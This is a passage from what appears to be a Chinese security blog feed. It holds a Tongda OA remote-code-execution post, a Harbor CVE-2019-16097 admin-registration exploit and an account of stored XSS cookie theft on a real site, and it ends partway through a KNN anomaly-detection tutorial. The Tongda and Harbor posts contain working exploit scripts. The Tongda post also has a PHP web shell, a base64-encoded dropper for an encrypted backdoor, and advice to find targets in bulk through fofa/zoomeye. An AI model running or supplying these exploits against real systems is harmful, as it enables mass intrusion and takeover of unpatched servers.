    <content type="html"><![CDATA[<h1 id="通达OA之RCE（批量刷洞）"><a href="#通达OA之RCE（批量刷洞）" class="headerlink" title="通达OA之RCE（批量刷洞）"></a>通达OA之RCE（批量刷洞）</h1><a id="more"></a><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><p>通达OA V11版 &lt;= 11.3 20200103<br>通达OA 2017版 &lt;= 10.19 20190522<br>通达OA 2016版 &lt;= 9.13 20170710<br>通达OA 2015版 &lt;= 8.15 20160722<br>通达OA 2013增强版 &lt;= 7.25 20141211<br>通达OA 2013版 &lt;= 6.20 20141017</p><h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><p>能够远程执行计算机指令</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>漏洞文件位置：<code>isprit/im/upload</code></p><p>该文件存在逻辑漏洞，当<code>$P</code>非空的时候就不需要经过验证是否登录可以直接上传文件。</p><p><img src="/images/img20200318111612.png" alt="img"></p><p>但是上传之后的文件并没有在根目录下，因此无法直接使用，所以只有通过文件包含漏洞进行利用</p><p><img src="/images/img20200318111630.png" alt="img"></p><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>位置：<code>ispirit/interface/gateway.php</code></p><p>上传的时候，只要没有参数P就无需验证</p><p><img src="/images/img20200318111550-1.png" alt="img"></p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><p>构造数据包，上传文件</p><p><img src="/images/image-20200319121325031.png" alt="image-20200319121325031"></p><p>构造数据包，执行系统命令</p><p><img src="/images/image-202003191213503822.png" alt="image-20200319121350382"></p><h2 id="0x06-漏洞验证与利用"><a href="#0x06-漏洞验证与利用" class="headerlink" title="0x06 漏洞验证与利用"></a>0x06 漏洞验证与利用</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>写了个简单的POC，可以适当修改成批量的POC检测，或者EXP。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">upload_data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;P&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">123</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/jpeg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">$command=$_POST[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="string">$wsh = new COM(&#x27;WScript.shell&#x27;);</span></span><br><span class="line"><span class="string">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span></span><br><span class="line"><span class="string">$stdout = $exec-&gt;StdOut();</span></span><br><span class="line"><span class="string">$stroutput = $stdout-&gt;ReadAll();</span></span><br><span class="line"><span class="string">echo $stroutput;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypyfBh1YB4pV8McGB--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploadfile</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="comment"># target = &quot;http://&quot; + target + &quot;:80/ispirit/im/upload.php&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: target,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + target + <span class="string">&quot;:80/ispirit/im/upload.php&quot;</span></span><br><span class="line"></span><br><span class="line">    resp = requests.post(url, headers=headers, data=upload_data)</span><br><span class="line">    jpgname = re.split(<span class="string">&#x27;[@ _ |]&#x27;</span>, <span class="built_in">str</span>(resp.content))</span><br><span class="line">    name = jpgname[<span class="number">2</span>] + <span class="string">&quot;/&quot;</span> + jpgname[<span class="number">3</span>] + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC</span>(<span class="params">target, name</span>):</span></span><br><span class="line">    cmd_data = <span class="string">&#x27;json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/&#x27;</span> + name + <span class="string">&#x27;&quot;&#125;&amp;cmd=net user&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: target,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span> + target + <span class="string">&quot;:80/mac/gateway.php&quot;</span></span><br><span class="line">    resp = requests.post(url, headers=headers, data=cmd_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;No input&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        url = <span class="string">&quot;http://&quot;</span> + target + <span class="string">&quot;:80/ispirit/interface/gateway.php&quot;</span></span><br><span class="line">        resp = requests.post(url, headers=headers, data=cmd_data)</span><br><span class="line">    print(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target = sys.argv[<span class="number">1</span>] </span><br><span class="line">    name = uploadfile(target)</span><br><span class="line">    POC(target, name)</span><br></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="/images/image-20200319135145445.png" alt="image-20200319121147574"></p><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp &#x3D; fopen(&#39;readme.php&#39;, &#39;w&#39;);</span><br><span class="line">$a &#x3D; base64_decode(&quot;PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9HRVRbJ3Bhc3MnXSkpCnsKICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOwogICAgJF9TRVNTSU9OWydrJ109JGtleTsKICAgIHByaW50ICRrZXk7Cn0KZWxzZQp7CiAgICAka2V5PSRfU0VTU0lPTlsnayddOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQoJQG5ldyBDKCRwYXJhbXMpOwp9Cj8+&quot;);</span><br><span class="line">fwrite($fp, $a);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以替换掉代码 <code>upload_data</code> 中的php代码 。然后需要访问一下图片木马，php代码才会被执行。执行后会创建一个木马，位置在<code>/ispirit/interface/</code>目录中，用冰蝎连接即可。</p><p><img src="/images/image-20200319125232468.png" alt="image-20200319125232468"></p><h2 id="0x07-修复"><a href="#0x07-修复" class="headerlink" title="0x07 修复"></a>0x07 修复</h2><p>目前已经给出修复两个文件的修复建议，及时更换两个文件即可。</p><h2 id="0x08-批量刷洞"><a href="#0x08-批量刷洞" class="headerlink" title="0x08 批量刷洞"></a>0x08 批量刷洞</h2><p>使用 <code>zoomeye</code> 或者 <code>fofa</code> 搜索关键词 <code>通达OA</code></p><p><img src="/images/image-20200319133939748.png" alt="image-20200319133939748"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/jas502n/OA-tongda-RCE">https://github.com/jas502n/OA-tongda-RCE</a></p><p><a href="https://www.adminxe.com/1003.html">https://www.adminxe.com/1003.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;通达OA之RCE（批量刷洞）&quot;&gt;&lt;a href=&quot;#通达OA之RCE（批量刷洞）&quot; class=&quot;headerlink&quot; title=&quot;通达OA之RCE（批量刷洞）&quot;&gt;&lt;/a&gt;通达OA之RCE（批量刷洞）&lt;/h1&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Harbor任意管理员注册漏洞复现(CVE-2019-16097)</title>
    <link href="http://example.com/2020/03/09/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-16097/"/>
    <id>http://example.com/2020/03/09/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-16097/</id>
    <published>2020-03-09T13:40:50.000Z</published>
    <updated>2020-03-10T01:23:17.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Harbor任意管理员注册漏洞复现-CVE-2019-16097"><a href="#Harbor任意管理员注册漏洞复现-CVE-2019-16097" class="headerlink" title="Harbor任意管理员注册漏洞复现(CVE-2019-16097)"></a>Harbor任意管理员注册漏洞复现(CVE-2019-16097)</h2><h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p>  Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。</p><a id="more"></a><h3 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h3><p>注册模块校验不严格，造成垂直越权，使得任意用户均可注册管理员账号。</p><h3 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h3><p>攻击者可以通过管理员账号管理Harbor镜像库，从而写入或替换成恶意的镜像，最终可以感染使用此仓库的客户端。</p><h3 id="0x04-影响版本"><a href="#0x04-影响版本" class="headerlink" title="0x04 影响版本"></a>0x04 影响版本</h3><p><code> 1.7.0-1.8.2</code></p><h3 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h3><p>使用 fofa 搜索关键词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;&quot;Harbor&quot; &amp;&amp; country&#x3D;CN</span><br></pre></td></tr></table></figure><p>找到注册页面</p><p><img src="/images/image-20200309214832733.png" alt="image-20200309214832733"></p><p>然后抓包</p><p><img src="/images/image-20200309215639755.png" alt="image-20200309215639755"></p><p>在末尾添加上如上图的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;has_admin_role&quot;:true</span><br></pre></td></tr></table></figure><p>返回码如果是201，则表示注册成功，登录即可。</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20200309213826.png" alt="TIM截图20200309213826"></p><h3 id="0x06-脚本"><a href="#0x06-脚本" class="headerlink" title="0x06 脚本"></a>0x06 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve2019_10697</span>(<span class="params">url</span>):</span></span><br><span class="line">base_url = url + <span class="string">&quot;/api/users&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;username&quot;:&quot;unihac&quot;,&quot;email&quot;:&quot;unihac@gmail.com&quot;,&quot;realname&quot;:&quot;unihac&quot;,&quot;password&quot;:&quot;P@ssword&quot;,&quot;comment&quot;:&quot;0&quot;,&quot;has_admin_role&quot;:true&#125;&#x27;</span></span><br><span class="line">header = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(base_url, data=payload, headers=header, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">201</span>:</span><br><span class="line">        print(<span class="string">&quot;--+ This URL is Vulnerable !&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;--+ Login username: unihac   password: P@assword&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&quot;Like: http://example.com:10000&quot;</span>)</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;URL: &quot;</span>)</span><br><span class="line">    cve2019_10697(url)</span><br></pre></td></tr></table></figure><h3 id="0x07-防御"><a href="#0x07-防御" class="headerlink" title="0x07 防御"></a>0x07 防御</h3><p>升级到最新版本。如1.7.6 以及 1.8.3</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Harbor任意管理员注册漏洞复现-CVE-2019-16097&quot;&gt;&lt;a href=&quot;#Harbor任意管理员注册漏洞复现-CVE-2019-16097&quot; class=&quot;headerlink&quot; title=&quot;Harbor任意管理员注册漏洞复现(CVE-2019-16097)&quot;&gt;&lt;/a&gt;Harbor任意管理员注册漏洞复现(CVE-2019-16097)&lt;/h2&gt;&lt;h3 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h3&gt;&lt;p&gt;  Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。&lt;/p&gt;</summary>
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Harbor" scheme="http://example.com/tags/Harbor/"/>
    
  </entry>
  
  <entry>
    <title>某机构XSS实战</title>
    <link href="http://example.com/2020/03/05/%E6%9F%90%E6%9C%BA%E6%9E%84XSS%E5%AE%9E%E6%88%98/"/>
    <id>http://example.com/2020/03/05/%E6%9F%90%E6%9C%BA%E6%9E%84XSS%E5%AE%9E%E6%88%98/</id>
    <published>2020-03-04T23:23:45.000Z</published>
    <updated>2020-03-04T23:38:02.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次网站XSS之旅"><a href="#一次网站XSS之旅" class="headerlink" title="一次网站XSS之旅"></a>一次网站XSS之旅</h1><p>突然想到一个几年前的网站，当时宣传他们的培训机构。还宣传他们哪儿同样有网络安全培训，也有官网，然后我饶有兴趣的就去膜拜了一番他们的官网。</p><h2 id="0x01-找关键点"><a href="#0x01-找关键点" class="headerlink" title="0x01 找关键点"></a>0x01 找关键点</h2><p>输入被直接被输出到网页上显示。</p><h2 id="0x02-第一处XSS漏洞"><a href="#0x02-第一处XSS漏洞" class="headerlink" title="0x02 第一处XSS漏洞"></a>0x02 第一处XSS漏洞</h2><p>抱着希望的阿弥陀佛的态度，挨个挨个用xss代码，如下图</p><p><img src="/images/clip_image002.jpg" alt="img"></p><p>然后，阿弥陀佛保佑在这个在个人信息处（个人主页）存在存储型xss注入。</p><p><img src="/images/clip_image004.jpg" alt="img"></p><p><img src="/images/clip_image006.jpg" alt="img"></p><p>已经可以弹出cookie了。这样就可以提交漏洞了么？当然不行，虽然确实存在xss存储漏洞，但是没实际影响。因为</p><p><img src="/images/clip_image008.jpg" alt="img"></p><p>这就郁闷了，也不能修改公开。没啥危害哇！</p><h2 id="0x03-第二处xss漏洞"><a href="#0x03-第二处xss漏洞" class="headerlink" title="0x03 第二处xss漏洞"></a>0x03 第二处xss漏洞</h2><p>抱着同一个网站，可能会存在相似的漏洞心态，接着到处测试。看见输入框，贴上代码就行了。最终，保佑我在发送私信的地方存在xss注入。</p><p>申请两个账号，互相发送消息测试呗。</p><p><img src="/images/clip_image010.jpg" alt="img"></p><p>另一个账号收到发送的消息</p><p><img src="/images/clip_image012.jpg" alt="img"></p><p>点击xss查看消息，就获取到cookie了</p><p><img src="/images/clip_image014.jpg" alt="img"></p><p>第二处XSS代码找到了。</p><h2 id="0x04-XSS-挖掘"><a href="#0x04-XSS-挖掘" class="headerlink" title="0x04 XSS 挖掘"></a>0x04 XSS 挖掘</h2><p><strong><em>某大佬的经典台词：有框必X\</em></strong></p><h2 id="0x05-XSS-防御"><a href="#0x05-XSS-防御" class="headerlink" title="0x05 XSS 防御"></a>0x05 XSS 防御</h2><p>如果是HTML元素直接使用htmlspecialchars函数转义，如果是属性，使用htmlspecialchars函数转义并使用双引号括起来。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一次网站XSS之旅&quot;&gt;&lt;a href=&quot;#一次网站XSS之旅&quot; class=&quot;headerlink&quot; title=&quot;一次网站XSS之旅&quot;&gt;&lt;/a&gt;一次网站XSS之旅&lt;/h1&gt;&lt;p&gt;突然想到一个几年前的网站，当时宣传他们的培训机构。还宣传他们哪儿同样有网络安全培训，</summary>
      
    
    
    
    
    <category term="实战" scheme="http://example.com/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>sklearn之KNN近邻算法</title>
    <link href="http://example.com/2020/01/07/sklearn%E4%B9%8BKNN%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/"/>
    <id>http://example.com/2020/01/07/sklearn%E4%B9%8BKNN%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/</id>
    <published>2020-01-07T06:02:51.000Z</published>
    <updated>2021-02-04T05:14:06.054Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sklearn之knn近邻算法"><a href="#sklearn之knn近邻算法" class="headerlink" title="sklearn之knn近邻算法"></a>sklearn之knn近邻算法</h1><h2 id="近邻算法检测异常操作"><a href="#近邻算法检测异常操作" class="headerlink" title="近邻算法检测异常操作"></a>近邻算法检测异常操作</h2><p>数据来源:<code>http://www.schonlau.net/</code>网页中的<code>Masquerading User Data</code>。其中包含50个用户的操作日志，每个日志包含1500条操作命令，前面5000条是正常的操作，后面的10000条日志中随即包含有异常操作。具体参考《Web安全机器学习入门》</p><a id="more"></a><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>本来想自己写的，但是网上资料太多，就没必要写了。看下其他大佬写过的就行了：</p><ul><li><a href="https://blog.csdn.net/zgcr654321/article/details/85219121">https://blog.csdn.net/zgcr654321/article/details/85219121</a> </li><li><a href="https://www.jianshu.com/p/3dcb39de04aa">https://www.jianshu.com/p/3dcb39de04aa</a> </li></ul><p>这两个看了，基本上就没啥问题了</p><h2 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h2><p>Step 1：随便选择一个user日志，里面每行代表一个命令。每150个命令弄成一个操作序列，保存在列表之中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>(<span class="params">filename</span>):</span></span><br><span class="line">    most_cmd = []</span><br><span class="line">    mini_cmd = []</span><br><span class="line">    cmd_list = []</span><br><span class="line">    cmd_seq = []</span><br><span class="line">    <span class="comment"># 获取操作序列</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        cmd = f.readline()</span><br><span class="line">        temp = []</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(cmd):</span><br><span class="line">            cmd_list.append(cmd.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">            temp.append(cmd.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">            cnt = cnt + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(cnt == <span class="number">150</span>):  <span class="comment">#  这里不按照书上的分，我这里按照150个命令为一个序列，刚好和标签对上号，因为标签只有100个值</span></span><br><span class="line">                cmd_seq.append(temp)</span><br><span class="line">                cnt = <span class="number">0</span></span><br><span class="line">                temp = []</span><br><span class="line">            cmd = f.readline()</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>Step 2：然后将user日志中所有的命令进行统计，统计出它们最频繁的50个命令，以及最不频繁的50个命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取最频繁的前50个命令，获取最不频繁的前50个命令</span></span><br><span class="line">fdist = <span class="built_in">sorted</span>(FreqDist(cmd_list).items(),key = operator.itemgetter(<span class="number">1</span>), reverse = <span class="literal">True</span>) <span class="comment"># 按照出现频率排序</span></span><br><span class="line">most_cmd = [ item[<span class="number">0</span>] <span class="keyword">for</span> item <span class="keyword">in</span> fdist[:<span class="number">50</span>]]</span><br><span class="line">mini_cmd = [ item[<span class="number">0</span>] <span class="keyword">for</span> item <span class="keyword">in</span> fdist[-<span class="number">50</span>:]]</span><br></pre></td></tr></table></figure><p>Step 3：特征化。在 <code>Step 1</code> 的操作序列上，我们按一个操作系列为单元，①统计其中不重复的命令个数、②最频繁的10个命令、③最不频繁的10个命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">user_feature = [] </span><br><span class="line"><span class="keyword">for</span> cmd_list <span class="keyword">in</span> user_cmd_list:</span><br><span class="line">    <span class="comment"># 获取每个序列不重复命令的个数</span></span><br><span class="line">    seq_len = <span class="built_in">len</span>(<span class="built_in">set</span>(cmd_list))</span><br><span class="line">    <span class="comment"># 将每个序列按照出现频率由高到低的排列命令</span></span><br><span class="line">    fdist = <span class="built_in">sorted</span>(FreqDist(cmd_list).items(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="literal">True</span>)</span><br><span class="line">    seq_freq = [item[<span class="number">0</span>] <span class="keyword">for</span> item <span class="keyword">in</span> fdist]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取最频繁和最不频繁的前10个命令</span></span><br><span class="line">    f2 = seq_freq[:<span class="number">10</span>]</span><br><span class="line">    f3 = seq_freq[-<span class="number">10</span>:]</span><br></pre></td></tr></table></figure><p>Step 4：因为KNN只能接收数值类型输入。在 <code>Step 4</code> 中，②和③都是字符串的命令，我们需要将其标量化。标量化的方式：统计最频繁使用的50个命令和最不频繁使用的50个命令计算重合程度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算重合度</span></span><br><span class="line">f2 = <span class="built_in">len</span>(<span class="built_in">set</span>(f2) &amp; <span class="built_in">set</span>(user_max_freq))</span><br><span class="line">f3 = <span class="built_in">len</span>(<span class="built_in">set</span>(f3) &amp; <span class="built_in">set</span>(user_min_freq))</span><br><span class="line"><span class="comment"># 合并特征：①每个序列不重复的命令个数；②每个序列最频繁的前10个命令和user中最频繁的50个命令重合度；</span></span><br><span class="line"><span class="comment"># ③每个序列最不频繁的前10个命令和user中最不频繁的前50个命令重合度；</span></span><br><span class="line">user_feature.append([seq_len, f2, f3])</span><br></pre></td></tr></table></figure><h2 id="python3完整代码如下"><a href="#python3完整代码如下" class="headerlink" 